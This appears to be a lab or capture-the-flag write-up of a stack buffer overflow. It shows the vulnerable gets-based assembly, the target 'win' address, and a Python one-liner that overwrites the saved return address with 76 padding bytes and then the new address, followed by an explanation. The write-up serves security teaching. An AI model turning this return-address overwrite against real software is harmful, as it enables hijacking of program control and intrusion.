# ex04 - Stack overflow into saved EIP

## Goal
Print `code flow successfully changed`.

## Relevant assembly (`main`)
```asm
08048408: push ebp
08048409: mov  ebp,esp
0804840b: and  esp,0xfffffff0
0804840e: sub  esp,0x50
08048411: lea  eax,[esp+0x10]        ; 64-byte buffer
08048415: mov  DWORD PTR [esp],eax
08048418: call gets                   ; unsafe read
0804841d: leave
0804841e: ret
```

The `win` function is at `0x080483f4`:
```asm
080483fa: mov  DWORD PTR [esp],0x80484e0   ; "code flow successfully changed"
08048401: call puts
```

## Exploit
```bash
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*76 + b"\xf4\x83\x04\x08" + b"\n")' | ./bin
```

## Why it works
`gets` has no length limit. 76 padding bytes fill the buffer, saved EBP, and land on saved EIP; the following 4 bytes set EIP to `win`. When `main` returns, execution goes to `0x080483f4`.

